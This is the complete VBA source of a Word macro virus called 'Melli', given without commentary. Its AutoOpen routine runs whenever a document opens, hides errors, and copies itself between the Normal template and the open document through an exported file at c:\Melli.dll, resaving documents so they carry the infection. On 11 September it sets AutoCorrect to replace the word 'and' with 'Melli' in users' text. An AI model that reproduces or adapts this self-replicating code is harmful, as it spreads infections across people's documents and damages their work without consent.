   Attribute VB_Name = "Melli"
   Sub AutoOpen()
   On Error Resume Next
   If NormalTemplate.VBProject.VBComponents.Item("Melli").Name <> "Melli" Then
   NotInNorm = True
   ActiveDocument.VBProject.VBComponents("Melli").Export "c:\Melli.dll"
   Set Dobj = NormalTemplate.VBProject
   ElseIf ActiveDocument.VBProject.VBComponents.Item("Melli").Name <> "Melli" Then
   NotInActiv = True
   NormalTemplate.VBProject.VBComponents("Melli").Export "c:\Melli.dll"
   Set Dobj = ActiveDocument.VBProject
   End If
   If NotInNorm = True Or NotInActiv = True Then Dobj.VBComponents.Import ("c:\Melli.dll")
   If NotInActiv = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

   If Day(Now()) = 11 And Month(Now()) = 9 Then
       AutoCorrect.Entries.Add Name:="and", Value:="Melli"
       AutoCorrect.ReplaceText = True
    End If

   End Sub
